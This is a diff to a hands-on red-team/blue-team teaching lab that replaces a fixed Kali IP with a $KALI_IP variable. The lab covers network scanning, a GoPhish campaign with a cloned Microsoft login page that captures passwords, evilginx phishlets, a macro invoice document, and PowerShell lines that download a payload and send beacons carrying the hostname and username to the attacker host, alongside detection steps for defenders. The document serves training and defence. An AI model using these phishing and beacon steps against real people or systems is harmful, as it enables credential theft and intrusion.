@@ -2,10 +2,17 @@
 ## Hands-On Lab
 
 ```
-Kali (attacker)   192.168.11.149
+Kali (attacker)   $KALI_IP  ← set this once, used everywhere below
 Windows (victim)  find with: ipconfig → IPv4 Address
-Lab domain        redlab.local  →  192.168.11.149
+Lab domain        redlab.local  →  $KALI_IP
 ```
+
+**Set your IP once at the start of every session — all commands use `$KALI_IP`:**
+```bash
+source config.sh          # auto-detects your IP
+echo $KALI_IP             # verify it looks right
+```
+If auto-detection picks the wrong interface, open `config.sh` and set `KALI_IP` manually.
 
 ---
 
@@ -32,7 +39,7 @@ gophish --version
 ```
 C:\Windows\System32\drivers\etc\hosts
 
-192.168.11.149  redlab.local
+$KALI_IP  redlab.local
 ```
 
 Open **4 terminals** on Kali now — each module below says which terminal to use.
@@ -103,7 +110,7 @@ https://www.shodan.io/search?query=org%3A%22<Company+Name>%22+port%3A3389
 
 ## Phase 2 — Active Recon (Network Scanning)
 
-> **Blue team:** start Wireshark now → filter `ip.src == 192.168.11.149`
+> **Blue team:** start Wireshark now → filter `ip.src == $KALI_IP`
 
 **Terminal 1**
 
@@ -147,7 +154,7 @@ sudo nmap -A -T4 $VICTIM
 > netsh advfirewall set allprofiles logging droppedconnections enable
 > netsh advfirewall set allprofiles logging filename C:\fw.log
 > ```
-> Then: `Get-Content C:\fw.log | Select-String "192.168.11.149"`
+> Then: `Get-Content C:\fw.log | Select-String "$KALI_IP"`
 
 ---
 
@@ -172,7 +179,7 @@ python3 tools/smtp_server.py
 ```bash
 python3 tools/http_server.py
 # Listens on 0.0.0.0:8080
-# Fake login page → http://192.168.11.149:8080/
+# Fake login page → http://$KALI_IP:8080/
 ```
 
 ---
@@ -208,7 +215,7 @@ Landing Pages → New Page
   Name:   Microsoft Login Clone
 
   Option A — import live:
-    Import Site → http://192.168.11.149:8080/
+    Import Site → http://$KALI_IP:8080/
     (pulls templates/fake_login.html from our server)
 
   Option B — paste HTML:
@@ -257,7 +264,7 @@ Campaigns → New Campaign
   Name:            Lesson1-Phishing
   Email Template:  Microsoft 365 Security Alert
   Landing Page:    Microsoft Login Clone
-  URL:             http://192.168.11.149:8080
+  URL:             http://$KALI_IP:8080
   Launch Date:     (now)
   Sending Profile: Lab SMTP Relay
   Groups:          Lab Victims
@@ -286,7 +293,7 @@ Click "Submitted Data" to view: username · password
 > Check:
 >   From:         noreply@microsoft-support.com  ← NOT microsoft.com
 >   Return-Path:  same spoofed domain
->   Received:     shows 192.168.11.149 (our Kali) as origin
+>   Received:     shows $KALI_IP (our Kali) as origin
 >   Authentication-Results: spf=none  dkim=none  dmarc=none
 > ```
 
@@ -314,7 +321,7 @@ httrack "http://testphp.vulnweb.com/login.php" \
 ```bash
 # Serve the clone on port 9090 for comparison
 cd /tmp/clone && python3 -m http.server 9090
-# Victim visits: http://192.168.11.149:9090/
+# Victim visits: http://$KALI_IP:9090/
 ```
 
 Show students side-by-side: real site vs cloned — they look identical.
@@ -352,7 +359,7 @@ Walk through the VBA line by line:
 ```
 ```powershell
 # On Windows — download it from Kali
-Invoke-WebRequest -Uri "http://192.168.11.149:8080/payloads/invoice_Q4_2024.docx" `
+Invoke-WebRequest -Uri "http://$KALI_IP:8080/payloads/invoice_Q4_2024.docx" `
                   -OutFile "$env:TEMP\invoice_Q4_2024.docx"
 ```
 ```
@@ -367,7 +374,7 @@ Invoke-WebRequest -Uri "http://192.168.11.149:8080/payloads/invoice_Q4_2024.docx
 **On Windows victim (run each command, one at a time):**
 ```powershell
 # Show what URL we're hitting
-$url = "http://192.168.11.149:8080/payloads/calc_payload.ps1"
+$url = "http://$KALI_IP:8080/payloads/calc_payload.ps1"
 ```
 ```powershell
 # Download with WebClient (most compatible)
@@ -405,7 +412,7 @@ python3 tools/beacon.py
 ```powershell
 while ($true) {
     $qs = "host=$env:COMPUTERNAME&user=$env:USERNAME"
-    Invoke-WebRequest -Uri "http://192.168.11.149:8080/beacon?$qs" `
+    Invoke-WebRequest -Uri "http://$KALI_IP:8080/beacon?$qs" `
                       -UseBasicParsing | Out-Null
     Write-Host "[$(Get-Date -f 'HH:mm:ss')] beacon sent"
     Start-Sleep -Seconds 10
@@ -444,13 +451,13 @@ Get-Content "$env:TEMP\macro_ran.txt"
 
 ### Find network connections to attacker
 ```powershell
-# Any active connections to 192.168.11.149?
+# Any active connections to $KALI_IP?
 Get-NetTCPConnection -State Established |
-    Where-Object RemoteAddress -eq "192.168.11.149"
+    Where-Object RemoteAddress -eq "$KALI_IP"
 
 # What process owns those connections?
 Get-NetTCPConnection -State Established |
-    Where-Object RemoteAddress -eq "192.168.11.149" |
+    Where-Object RemoteAddress -eq "$KALI_IP" |
     ForEach-Object {
         [PSCustomObject]@{
             Process = (Get-Process -Id $_.OwningProcess).Name
@@ -463,7 +470,7 @@ Get-NetTCPConnection -State Established |
 ### Check firewall log for port scan
 ```powershell
 Get-Content "C:\fw.log" | Select-String "DROP" | Select -Last 30
-# Look for rapid-fire entries from 192.168.11.149
+# Look for rapid-fire entries from $KALI_IP
 ```
 
 ### Enable and read PowerShell script block logs
@@ -523,7 +530,7 @@ sudo evilginx -developer -p /opt/evilginx2/phishlets/
 ```
 # Inside evilginx console
 config domain redlab.local
-config ip 192.168.11.149
+config ip $KALI_IP
 phishlets hostname o365 redlab.local
 phishlets enable o365
 lures create o365
@@ -547,8 +554,8 @@ See `lesson1/setup/evilginx_notes.md` for full phishlet setup.
 | GoPhish dashboard | `https://127.0.0.1:3333` · `admin` / `kali-gophish` |
 | Start SMTP relay | `python3 tools/smtp_server.py` |
 | Start HTTP server | `python3 tools/http_server.py` |
-| Fake login page | `http://192.168.11.149:8080/` |
-| Download calc payload | `http://192.168.11.149:8080/payloads/calc_payload.ps1` |
+| Fake login page | `http://$KALI_IP:8080/` |
+| Download calc payload | `http://$KALI_IP:8080/payloads/calc_payload.ps1` |
 | Captured credentials | `cat captured_credentials.log` |
 | Ping sweep | `nmap -sn 192.168.11.0/24` |
 | Fast port scan | `nmap -sV -T4 --open $VICTIM` |
@@ -560,7 +567,7 @@ See `lesson1/setup/evilginx_notes.md` for full phishlet setup.
 
 | Indicator | Type | Source |
 |-----------|------|--------|
-| `192.168.11.149` making port scan | Network | Wireshark / fw.log |
+| `$KALI_IP` making port scan | Network | Wireshark / fw.log |
 | Email from `*-support.com` not `microsoft.com` | Email header | SPF/DKIM fail |
 | `powershell.exe` → outbound HTTP to `:8080` | Process + Network | Sysmon / netstat |
 | `WINWORD.EXE` → `cmd.exe` → `powershell.exe` | Process tree | Sysmon Event 1 |
